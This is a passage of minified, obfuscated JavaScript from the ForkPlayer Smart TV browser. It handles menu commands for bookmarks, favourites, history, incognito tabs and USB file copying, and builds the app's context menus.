var s=maJor.read("glstart");if(s.indexOf("{")!==0){var favlist=[];var fch=readSt();for(var i in fch){if(gV(fch[i],"source")=="fav")favlist.push(gV(fch[i]))}}
if(favarray!=null)caddtostart(favarray);else if(getSelect()<0){ch={};ch.playlist_url=IlO11lQ0().get("url");ch.title=IlO11lQ0().get("title");ch.logo_30x30=IlO11lQ0().get("img");ch.parser=IlO11lQ0().get("p");caddtostart(ch)}else{markedObj.entries(function(m,n){caddtostart(m)});markedObj.cancel()}
handler="menu";if(l0O0l0111mJXG1OII1OYpr())IlO11lQ0().reload();else IlO11lQ0().focused();favarray=null;break;case "cmdDelFromStart":t=getVars("start");markedObj.entries(function(ch,n){if(ch.playlist_url=="searchEngines"){kjtYpr.inf("Этот пункт нельзя удалить!",1200)}else if(gV(ch,"source")=="fav"){t.fav.splice(ch.id,1);setVars("start",t);kjtYpr.inf("Удалено из Избранное ("+ch.title+")",1500)}else if(gV(ch,"source").match(/(usertop)/)){delete userTop[ch.playlist_url];kjtYpr.inf("Удалено из истории адрес сайта ("+ch.title+")",1500)}else if(gV(ch,"source").match(/(top|third|service)/)){if(typeof t.hidetop=="undefined")t.hidetop={};t.hidetop[ch.playlist_url+ch.stream_url]=1;setVars("start",t);kjtYpr.inf("Скрыто адрес сайта ("+(ch.title||ch.display_title||ch.playlist_url)+")",1500)}});markedObj.cancel();handler="menu";IlO11lQ0().reload();break;case "cmdNewInset":setSelect(0);newInset(0);handler="menu";break;case "cmdNewInsetPriv":setSelect(0);newInset(1);kjtYpr.popUp("Ваши действия в режиме инкогнито будут недоступны другим пользователям этого устройства. Однако закладки сохранятся.<br>В ForkPlayer не будет сохраняться следующая информация:<br>история просмотров; файлы cookie и данные сайтов;сведения, которые вы указываете в формах.",2500);handler="menu";break;case "cmdSetWeather":gP().lII1I1PVBuI1lIlYpr=cmd;var data={"playlist_name":""};data["chan"+"nels"]=[];for(var i=0;i<gs.count;i++){if(gs.url[i].title==""){var ttl=gs.url[i].url.split("/");gs.url[i].title=ttl[ttl.length-1].split(".")[0]}
var x=(gs.url[i].show=="1")?"<font color=green>_FPVkl_</font>":"<font color=red>_FPOtkl_</font>";data["chan"+"nels"].push({"logo_30x30":gs.url[i].logo,"title":gs.url[i].title+" "+x,"playlist_url":"setGlSearch"})}
handler="menu";kjtYpr.l1OQ10vaPl11l1Ypr(data);break;case "cmdSearch":handler="menu";IlO11lQ0().navigate("about:yoursearchEngines|"+ch.title);return;break;case "cmdFlash":kjtYpr.l11II0OI1JuTullll0Ypr(Menu[l0I10IWOIOOO1IYpr][3]);break;case "cmdUp":handler="move";return;break;case "":curPage=gP();if(getSelect()==-1){if(insetIn(-1,"get","url").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);handler="menu";return}}
if(gP("lII1I1PVBuI1lIlYpr").indexOf("no_save")>0){kjtYpr.inf("_FPCopied denied by author playlist_!",2500);handler="menu";return}
try{var n=opt||Menu[l0I10IWOIOOO1IYpr][3];if(n!="bookmarks/toolbar"){lastBookm.url=n;lastBookm.title=maJor.params.get(n);lastBookm.logo_30x30=""}
var pl_title=maJor.params.get(n);pl_title=maJor.params.get(n);if(n.indexOf("bookmarks/")==0){var s=""}else{s=maJor.read(n)}
var data=l0OIIlIIlONuu1111Ypr(s);if(data==null){data={};data["cha"+"nnels"]=[]}
if(!curPage.is_mark){curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
var count=0;for(var i=curPage.channels.length-1;i>=0;i--){if(curPage.is_mark_array[i]=="1"||getSelect()<0){if(favarray!=null)var ch=favarray;else if(getSelect()<0){ch={};ch.stream_url="";ch.playlist_url=IlO11lQ0().get("url");ch.title=IlO11lQ0().get("title");ch.logo_30x30=IlO11lQ0().get("img");ch.parser=ch.parser_orig=IlO11lQ0().get("p")}else ch=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(curPage.channels[i]));if(selfbookm){ch.stream_url="md5hash";var title=ch.title;if(title.indexOf("<div")==0){title=title.match(/.*nowrap;'>(.*?)</)[1]}
ch.parser=gP("lII1I1PVBuI1lIlYpr")+"|selfReNewBookmark|"+title}
if((ch.playlist_url+ch.stream_url).indexOf("no_save")>=0)kjtYpr.inf("_FPCopied denied by author playlist_!",2500);else if(s.indexOf(ch.playlist_url+ch.stream_url)!=-1&&ch.parser==""){kjtYpr.inf(ch.title.substr(0,15)+" - _FPZaklUzheEst_ "+pl_title,1000)}else{var obj=cleanCh(ch);if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",obj,count++);if(n=="bookmarks/addnew")break}else{data["cha"+"nnels"].unshift(obj);maJor.write(n,ll1lI1lI0sl0OlIYpr(data));lOI1I1i01O10lYpr();kjtYpr.inf("_FPDobavlenoV_ "+pl_title,1000)}}
if(getSelect()<0)break}}}catch(e){}
favarray=null;curPage.is_mark=!1;IlO11lQ0().focused();handler="menu";break;case "cmdMove":try{var n=Menu[l0I10IWOIOOO1IYpr][3];var pl_title=maJor.params.get(n);var s=maJor.read(n);if(!curPage.is_mark){curPage.is_mark=!0;curPage.is_mark_array={};curPage.is_mark_array[getSelect()]="1"}
if(n.indexOf("bookmarks/")!=0){var dataTo=l0OIIlIIlONuu1111Ypr(s);if(dataTo==null)dataTo={"channels":[]}}
if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")!=0)var data=l0OIIlIIlONuu1111Ypr(maJor.read(gP("lII1I1PVBuI1lIlYpr")));for(var i=0;i<curPage.channels.length;i++){if(curPage.is_mark_array[i]=="1"){if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,"add",curPage.channels[i])}else dataTo["cha"+"nnels"].unshift(curPage.channels[i])}}
var k=0;var ln=curPage.channels.length;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")==0){xhr_bookmark(gP("lII1I1PVBuI1lIlYpr"),"cmdDel",(i-k))}else data["chan"+"nels"].splice(i-k,1);k++}}
if(n.indexOf("bookmarks/")!=0)maJor.write(n,ll1lI1lI0sl0OlIYpr(dataTo));if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")!=0)maJor.write(gP("lII1I1PVBuI1lIlYpr"),ll1lI1lI0sl0OlIYpr(data));if(n.indexOf("bookmarks/")!=0)kjtYpr.inf("_FPPeremV_ "+pl_title,1000);curPage.is_mark=!1}catch(e){}
handler="menu";IlO11lQ0().reload();break;case "cmdDel":var n=gP("lII1I1PVBuI1lIlYpr");if(getSelect()==-2)n="bookmarks/toolbar";var data=l0OIIlIIlONuu1111Ypr(maJor.read(n));if(curPage.is_mark){var k=0;var ln=curPage.channels.length;var count=0;for(var i=0;i<ln;i++){if(curPage.is_mark_array[i]=="1"){if(gP("lII1I1PVBuI1lIlYpr").indexOf("bookmarks/")==0){if(n=="bookmarks/extbookm"){setTimeout('xhr_bookmark("bookmarks/extbookm","cmdDel",'+i+');',++count*100)}else xhr_bookmark(n,"cmdDel",i-k,count++)}else data["chan"+"nels"].splice(i-k,1);k++}}
curPage.is_mark=!1}else{if(n.indexOf("bookmarks/")==0){xhr_bookmark(n,cmd,getSelect())}else data["chan"+"nels"].splice(getSelect(),1)}
handler="menu";if(n.indexOf("bookmarks/")==0){IlO11lQ0().replace(data["chan"+"nels"])}else{maJor.write(n,ll1lI1lI0sl0OlIYpr(data));IlO11lQ0().replace(xhr_bookmark(n).channels);kjtYpr.inf("Удалено!",1000)}
break;case "cmdClearHistory":maJor.write("history","");lOO1IIlwlIl0l1lYpr=[];kjtYpr.inf("_FPIstOchishena_!",1000);handler="menu";IlO11lQ0().reload();break;case "cmdClearhistsearch":maJor.write("searches","");kjtYpr.inf("_FPIstOchishena_!",1000);curPage.channels=[];handler="menu";IlO11lQ0().focused();break;case "cmdClearhisturl":maJor.write("enteres","");kjtYpr.inf("_FPIstOchishena_!",1000);curPage.channels=[];lll00IOztuNlOOI0Ypr=Math.random();handler="menu";IlO11lQ0().focused();break;case "cmdForkStore":if(user!=null){autoexport("user")}
if(maJor.params.get('ts'))autoexport("store");else{if(maJor.platform()=="tizen")document.location="http://smart.obovse.ru/?do=forktizen";else document.location="http://smart.obovse.ru/?do=fork"}
break;case "cmdlaunchFullScreen":launchFullScreen(document.getElementsByTagName('body')[0]);break;case "cmdExit":handler="menu";if(maJor.params.get('ts')){autoexport("user");autoexport();setTimeout("closeapp();",2000)}else if(user!=null){autoexport("user");setTimeout("closeapp();",2000)}else closeapp();break;default:handler="menu";break}};function stmot(s){if(s==60)return"60s (_FPOtkl_)";else return s+"s"}
function shint(s,s2){if(s2!=null){if(s2=="p"){if(s=="")return"_FPOtkl._";else return s.replace(/./g,"*")}
if(s2=="a"){if(s==0)return"_FPOtkl._";if(s==1)return"_FPVkl._ (auto)";if(s==2)return"_FPVkl._ (Audio _FPpleer_)";if(s==3)return"_FPVkl._ (Html5 _FPpleer_)";if(s==4)return"_FPVkl._ (Media _FPpleer_)"}
if(s2==7){if(s==0)return"_FPOtkl._";else return"#"+s}
if(s2=="1")return"FS";else return"CXZ"}
if(s==12)return"_FPVkl._ (Rus - Eng)";else if(s==11)return"_FPVkl._ (Eng - Rus)";else if(s==13)return"_FPVkl._ (_FPManually_)";else if(s==3){if(maJor.params.get("remoteip")=="")var ds="_FPEnter_ IP:PORT";else ds=maJor.params.get("remoteip");return"_FPManually_ "+ds}else if(s==2)return"_FPAuto_";else if(s==1||s===!0)return"_FPVkl._";else if(s==0||s==10||s==20||s==40||s==""||s===!1)return"_FPOtkl._";else if(s==21)return"_FPTolko_ IPTV";else if(s==22)return"_FPDlyaVsV_";else if(s==29)return"_FPOnly local_";else if(s==30)return"_FPLocal_";else if(s==31)return"_FPOn Server_";else if(s==32)return"_FPOtkl_";else if(s==41)return"_FPPercent_";else if(s==50)return"_FPAuto_";else if(s>50&&s<70)return"_FPServer_ "+(s-50);else if(s==70)return"_FPpoumolch_";else if(s==71)return"V"+"K_RED";else if(s==72)return"V"+"K_GREEN";else if(s==73)return"V"+"K_YELLOW";else if(s==74)return"V"+"K_BLUE";else if(s==75)return"V"+"K_LEFT (только в списках)";else return s}
kjtYpr.Edit=function(n,cmd){var curPage=gP();var select=getSelect();if(l0O0l0111mJXG1OII1OYpr(n)){var ch=curCh();var oldselect=getSelect();if(cmd=="up")IlO11lQ0().posStart(0,-1);else if(cmd=="down")IlO11lQ0().posStart(0,1);else if(cmd=="left")IlO11lQ0().posStart(-1,0);else if(cmd=="right")IlO11lQ0().posStart(1,0);if(curPage.channels[oldselect].source!="fav"||curCh()["source"]!="fav"){IlO11lQ0().focused(oldselect);kjtYpr.popUp("_FPMove only Favorites_!",1000);return}
if(getSelect()<0)setSelect(0);if(oldselect!=getSelect()){var t=getVars("start");var tmp=t.fav[curPage.channels[oldselect].id];t.fav[curPage.channels[oldselect].id]=t.fav[curCh()["id"]];t.fav[curCh()["id"]]=tmp;setVars("start",t);handler="menu";curPage.channels=getVars("start").channels;IlO11lQ0().replace(curPage.channels);handler="move";return}}
var data=xhr_bookmark(n),sel=null;if(cmd=="up")var selnew=select-1;else if(cmd=="down")selnew=select+1;else if(cmd=="left")selnew=select-10;else if(cmd=="right")selnew=select+10;else selnew=null;if(selnew!=null){if(selnew<0)selnew=data.channels.length-1;else if(selnew>data.channels.length-1)selnew=0;if(selnew!=select){var x=data.channels[select];data.channels[select]=data.channels[selnew];data.channels[selnew]=x;xhr_bookmark(n,"update",data);setSelect(selnew);IlO11lQ0().replace(data.channels)}}};function llOlI0OfCMO0l0I0Ypr(n,y){var res=0;if(maJor.params.get("fs").substr(12,1)=="1"){if(n!=12&&n!=6)res=1}
if(y==null)return res;else if(y==1)return["Да","Нет"][res];else if(y==0)return["Нет","Да"][res];else return y[res]}
function FsetSetting(n,v){var d=llOlI0OfCMO0l0I0Ypr(n);if(v==null){if(++d>1)d=0}else d=v;var s="";for(var i=0;i<15;i++){if(i==n)s+=String(d);else s+=String(llOlI0OfCMO0l0I0Ypr(i))}
maJor.params.set("fs",s)}
var copyUsb="",copyUsbNames="",copyUsbMode=0,Menu;kjtYpr.llI0IOruD0IOI1IYpr=function(m,menu){l0I10IWOIOOO1IYpr=0;if(m==null)m="";Menu=[];var curPage=gP();var ch=IlO11lQ0().curCh();if(menu!=null)ch={"menu":menu,"playist_url":""};if(m=="topmenu"){var dop="";if(!maJor.user)dop="_FPProfile_<br><span style='font-size:70%;color:#d1d1d1;padding-left: 29px;'>_FPSign in to sync browser data across devices_</span>";else{var dop="_FPProfile_ "+maJor.user.login;if(maJor.timestamp<3)dop+="<br><span style='font-size:70%;padding-left: 29px;color: #ff9800; padding-left: 29px; font-weight: bold;'>_FPДля Вас есть информация в Профиле_</span>"}
Menu.push(Array(l0I10IWOIOOO1IYpr++,dop,function(){IlO11lQ0().navigate("http://cloudflare.appfxml.com/browseraccount/")}));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNew inset_","cmdNewInset"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNew private inset_","cmdNewInsetPriv"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNastrGlPoisk_","cmdGoURL","about:configsearch"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNastroiki_","cmdGoURL","about:settings"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"Контакты и Условия использования","cmdGoURL","about:info"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPZakladki_ / _FPIstoriya_ / Сохраненные страницы","cmdGoURL","about:favorites",_img("_ST_zakl.png")));tts="_FPVijtiV_ Fork Store";if(maJor.platform()=="tizen")tts+=" (HTML5)";if(!maJor.platform().match(/mag|dune|tizen|android-device/))Menu.push(Array(l0I10IWOIOOO1IYpr++,tts,"cmdForkStore"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPEXIT_","cmdExit"))}else if(m=="favmenu"){if(gP("SEARCH_TEMPL")!=""){var ex=l11IOOMMvt011llOYpr(gP("SEARCH_TEMPL"));if(ex>=0){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPEdit in Search engines_",function(){OpenUrl("about:configsearch#edit:sites:"+ex)}))}else{Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavVglob_",function(){try{var x=IlO11lQ0().history[IlO11lQ0().history.length-1]}catch(e){x={"title":"","img":gP("parentCh")["logo_30x30"]}}
var ttl=x.title+" "+gP("parentCh")["title"];var u=gP("SEARCH_TEMPL");if(typeof gP("parentCh")["search"]=="object"){if(gV(gP("parentCh")["search"],"title")!="")ttl=gV(gP("parentCh")["search"],"title");if(gV(gP("parentCh")["search"],"icon")!="")x.img=gV(gP("parentCh")["search"],"icon")}
IlO11lQ0().navigate({"playlist_url":"about:configsearch#edit:sites:new","new":{"title":ttl,"logo":x.img,"url":u}})}))}}else{Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ _FPStartovoeMenu_","cmdToStart"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ _FPBookmark toolbar_","","bookmarks/toolbar"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ _FPzakladki_","Bookmarks"));if(lastBookm.url!="")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ "+lastBookm.title,"",lastBookm.url))}}else if(getSelect()==-2){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPUdalit_ _FPizZakladok_","cmdDel"))}else if(getSelect()==-1&&m==""){if(oldinset!=null&&m!="favmenu"){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOpen closed tab_","cmdOpenInsetClose"))}
if(insetSelect==insetActive&&!l0O0l0111mJXG1OII1OYpr()){if(IlO11lQ0().get("b"))Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPRazblVkl_",function(){IlO11lQ0().put("b","0")}));else Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPZablVkl_",function(){IlO11lQ0().put("b","1")}));if(IlO11lQ0().get("a"))Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPUdIzSt_",function(){IlO11lQ0().put("b","0");IlO11lQ0().put("a","0")}));else Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPUstSart_",function(){IlO11lQ0().put("b","1");IlO11lQ0().put("a","1")}))}else if(oldinset==null)return}else if(submenuSelIcon.selicon){if(submenuSelIcon.title.indexOf("--")>0)var title=submenuSelIcon.title.split("--")[1];else title=submenuSelIcon.title;Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPSetIconFor_ \""+title.substr(0,8)+"\"","cmdSetIcon",curCh("logo_30x30")));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOtmena_","cmdSetIcon","cancel"))}else{if(typeof ch.menu=="object"){if(m=="onlymenu"){Menu=[]}
for(var i in ch.menu){Menu.push(Array(l0I10IWOIOOO1IYpr++,ch.menu[i].title,function(a){var p=gP()||Ill001();if(p.is_mark){p.is_mark=!1;for(var j=0;j<p.channels.length;j++){if(p.is_mark_array[j]=="1"){IlO11lQ0().navigate(p.channels[j].menu[a])}}}else{IlO11lQ0().navigate(ch.menu[a])}},i,ch.menu[i].logo_30x30))}}
if(m!="onlymenu"){if(gV(ch,"playlist_url")!="cmdmenu")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOpen_",function(){OpenUrl()}));if(IlO11lQ0().get("b")!="")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPRazblVkl_","cmdInsetBlock"));if(vPlayer.audio.played()){Menu.push(Array(l0I10IWOIOOO1IYpr++,"Управление аудио","cmdAudio"))}
if(gP().lII1I1PVBuI1lIlYpr.indexOf("wlist.php?id")>0){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPRun widget_",function(){confirmed.create("Open application in 1280х720","Run appliction");confirmed.fun0=function(){var u="http://obovse.ru/widget/tmp/"+ch.playlist_url.substr(6)+"/index.html"+location.search;document.location=u}}));Menu.push(Array(l0I10IWOIOOO1IYpr++,"Установить с заменой","cmdRewrite"))}
if(curPage.channels.length>0){if(l0O0l0111mJXG1OII1OYpr()){if(gV(ch,"source")=="fav"){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPPeredvinut_","cmdUp"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDeleteFromStartMenu_","cmdDelFromStart"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPEdit_","cmdEdit"))}else if(gV(ch,"source").match(/(usertop)/)){Menu.push(Array(l0I10IWOIOOO1IYpr++,"Перенести в Избранные ","cmdToStart"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"Удалить из истории","cmdDelFromStart"))}else if(gV(ch,"source").match(/(top|third|service)/)){Menu.push(Array(l0I10IWOIOOO1IYpr++,"Перенести в Избранные ","cmdToStart"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"Скрыть","cmdDelFromStart"))}}
if(chGroup.length>0){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPCategorys_","cmdGroup"))}
if(!l0O0l0111mJXG1OII1OYpr()&&gV(ch,"playlist_url").match(/^(bookmarks|zakladki)/)){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPEdit_","cmdEdit"))}
if(gP().is_iptv>2){if(ch.epg)var t=" ("+ch.epg+")";else t=" (_FPustanovit_)";Menu.push(Array(l0I10IWOIOOO1IYpr++,"ЕПГ код"+t,function(){fEpg.set_epg()},null,_img("_ST_epg.png")))}
if(apijsUrl&&payd.user)Menu.push(Array(l0I10IWOIOOO1IYpr++,"Выйти с аккаунта "+payd.user,function(){maJor.write("provUser","");payd={};handler="menu";tmf()}));if($_("description")&&$_("description").offsetHeight>550)
Menu.push(Array(l0I10IWOIOOO1IYpr++,"Описание на весь экран",function(){handler="description";$_("controlcontent").style.display="none";if($_("menu"))$_("menu").style.display="none";$_("description").style.display="none";$_("zpanel").style.display="block";$_("zpanel",$_("description").innerHTML);return 1},null,null));if(ch.stream_url&&!curPage.is_mark){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOpen with_",function(){var m=[];maJor.each(maJor.getPlayer().all,function(i){m.push({"title":i.title,"icon":_img("_ST_"+i.icon),"args":i.name,"cmd":function(a){IlO11lQ0().navigate(ch,a);return 1}})});showSubMenu(null,m);return 1},null,null,"right"));if($_("titleid"+getSelect()).style.textDecoration=="line-through")var t="_FPOtmNeProsm_";else t="_FPOtmProsm_";Menu.push(Array(l0I10IWOIOOO1IYpr++,t,function(){if(vPlayer.ftimes[getIdent()])delete vPlayer.ftimes[getIdent()];else vPlayer.ftimes[getIdent()]=[1,1];maJor.write("times",ll1lI1lI0sl0OlIYpr(vPlayer.ftimes));set_times(!0);handler="menu"},null,_img("_ST_cmdTimes.png")));if(is_img(ch.stream_url))Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPSetFon_",function(){maJor.params.set("fon",ch.stream_url);FXMLPage.ll00IOO11EVII1IYpr();kjtYpr.popUp("Фоном установлена ссылка:<br>"+ch.stream_url+"<br>Поменять фон можно в Настройках")}))}
if(ch.search_on){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavVglob_",function(){try{var x=IlO11lQ0().history[IlO11lQ0().history.length-1]}catch(e){x={"title":"","img":ch.logo_30x30}}
var ttl=x.title+" "+ch.title;var u=ch.playlist_url;if(ch.search){if(gV(ch.search,"title")!="")ttl=gV(ch.search,"title");if(gV(ch.search,"icon")!="")x.img=gV(ch.search,"icon");if(gV(ch.search,"playlist_url")!="")u=gV(ch.search,"playlist_url")}
FXMLPage.addGl(u,null,ttl,x.img)}))}
if(gP("lII1I1PVBuI1lIlYpr").match(/^(zakladki|bookmarks)/)){if(!curPage.is_mark)Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPPeredvinut_","cmdUp"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPUdalit_ _FPizZakladok_","cmdDel"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPPeremV_ ","cmdMoveBookmarks"))}
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPObnovitStranicy_",function(){IlO11lQ0().reload()}));if(!gP("lII1I1PVBuI1lIlYpr").match(/^(about:settings)/)){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPSource code_","cmdGoURL","view-source:"+gP("lII1I1PVBuI1lIlYpr")));if(curPage.is_mark){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPMark_ _FPvse_",function(){for(var i=0;i<curPage.channels.length;i++)curPage.is_mark_array[i]=1;IlO11lQ0().focused()}));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDese"+"lect_",function(){curPage.is_mark_array={};IlO11lQ0().focused();curPage.is_mark=0}))}else{Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPMark_ _FPseveral_",function(){curPage.is_mark=1;OpenUrl()}))}
if(curPage.global.player=="inner"){}else{Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ _FPzakladki_","Bookmarks"));if(lastBookm.url!="")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ "+lastBookm.title,"",lastBookm.url))}
if(gP().is_iptv>2){if(gV(ch,"order")!="")var st=" (Major: "+ch.order+")";else st="";Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPSorting_"+st,"cmdSorting"))}}
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPDobavitV_ _FPStartovoeMenu_","cmdToStart"))}else Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPPolnSbrosNastr_","cmdReset"));if(gP("lII1I1PVBuI1lIlYpr").indexOf("about:history")!=0)
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPIstoriya_ / Кеш","cmdHistory"));else Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOchistitIstoriyu_","cmdClearHistory"));if(gP("lII1I1PVBuI1lIlYpr").indexOf("about:histurl")==0||gP("lII1I1PVBuI1lIlYpr").indexOf("about:histsearch")==0)
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPOchistitIstoriyu_","cmdClear"+gP("lII1I1PVBuI1lIlYpr")));if(gP("lII1I1PVBuI1lIlYpr").indexOf("no_save")==-1&&gV(curPage.global,"player")!="inner")
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPSave page to cache_",function(){if(l11IIXTU1u1l1llIYpr(null,!0))kjtYpr.inf("OK!",1200);else kjtYpr.inf("Error!",1200);handler="menu"}));if(gP("lII1I1PVBuI1lIlYpr").indexOf("about:cache")==0)Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPClear cache_",function(){maJor.write("prev_cache","");kjtYpr.inf("Cache clear OK!",1000);handler="menu";IlO11lQ0().reload()},null,_img("_ST_delete.png")));if(!l0O0l0111mJXG1OII1OYpr()&&maJor.params.get('lang')!="ru")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPTranslate_ "+maJor.params.get("lang"),"cmdTranslate"));if(gP("lII1I1PVBuI1lIlYpr").indexOf("about:settings")!=0){if(!l0O0l0111mJXG1OII1OYpr())Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNaitiVglobPoiske_...","cmdSearch"));if(!l0O0l0111mJXG1OII1OYpr())Menu.push(Array(l0I10IWOIOOO1IYpr++,"Рецензии и фильмография...",function(){var data={"title":"Поиск фильмографии и рецензий на кинопоиске: "};data["chan"+"nels"]=[];if(IlO11lQ0().history.length>1){var ttl=IlO11lQ0().history[IlO11lQ0().history.length-1].title.split(" ");var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":"http://st.kp.yandex.net/images/logoWhite.png","title":s,"playlist_url":"http://p.lnka.ru/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}}
ttl=ch.title.replace(/\s+/g," ").split(" ");if(ttl.indexOf("<div")==0){ttl=ch.title.match(/nowrap;'>(.*?)</)[1].replace(/("|'|т\/c|х\/ф|,|Т\/с)/ig," ").replace(/\s+/g," ").split(" ")}
var s="";for(var i=0;i<ttl.length;i++){s+=ttl[i];if(i<ttl.length-1)s+=" ";data["chan"+"nels"].unshift({"logo_30x30":"http://st.kp.yandex.net/images/logoWhite.png","title":s,"playlist_url":"http://p.lnka.ru/http://kinopoisk.ru/?id=search&search="+encodeURIComponent(s)})}
handler="menu";OpenUrl(data,"usb://"+gP("lII1I1PVBuI1lIlYpr")+"#kinopoisk")}));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPNastroiki_","cmdMenuSettings"))}
if(gP("lII1I1PVBuI1lIlYpr").indexOf("usb:/")==0||(maJor.platform()=="maple"&&curCh("stream_url")!="")){Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPKopirovat_",function(){var ss="",ssn="";markedObj.entries(function(ch,n){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.indexOf("md5hash")!=-1){kjtYpr.inf("_FPNeedToOpenAndCloseTheVideoPlayerThenRepeatCopying_!",1500);handler="menu";return}
if(ss!="")ss+="-|-";ss+=s;if(ssn!="")ssn+="-|-";ssn+=ch.title});markedObj.cancel();copyUsb=ss;copyUsbNames=ssn}));if(gP("lII1I1PVBuI1lIlYpr")!="usb://"&&gP("lII1I1PVBuI1lIlYpr").indexOf("usb:/")==0){if(copyUsb!="")Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPVstavit_",function(){s=gP("lII1I1PVBuI1lIlYpr").replace("usb://","").replace("xml://","");copyUsbMode=0;if(s.length>0){kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPWhileCopyingFilesCannotViewVideoAndAudio_");vPlayer.maple.pasteFile(copyUsb,s,copyUsbNames)}
copyUsb="";setTimeout("IlO11lQ0().reload();",850)}));Menu.push(Array(l0I10IWOIOOO1IYpr++,"<font color=red>_FPUdalit_</font>",function(){confirmed.create("_FPAre you sure_?","_FPUdalit_").fun0=function(){markedObj.entries(function(ch,n){s=(gV(ch,"playlist_url")+gV(ch,"stream_url")).replace("usb://","").replace("xml://","");if(s.length>0)usbDelete(s)});IlO11lQ0().reload()};markedObj.cancel()},null,_img("_ST_delete.png")))}}
Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPZakladki_","cmdGoURL","about:favorites",_img("_ST_zakl.png")));if(maJor.params.get("remote")>0){Menu.push(Array(l0I10IWOIOOO1IYpr++,"Обновить сост. RemoteFork","cmdRemoteUpdate"))}
tts="_FPVijtiV_ Fork Store";if(maJor.platform()=="tizen")tts+=" (HTML5)";if(!maJor.platform().match(/mag|dune|tizen|android-device/))Menu.push(Array(l0I10IWOIOOO1IYpr++,tts,"cmdForkStore"));Menu.push(Array(l0I10IWOIOOO1IYpr++,"_FPEXIT_","cmdExit"))}}
if(Menu.length==0){kjtYpr.inf("Empty menu!",1200);return}
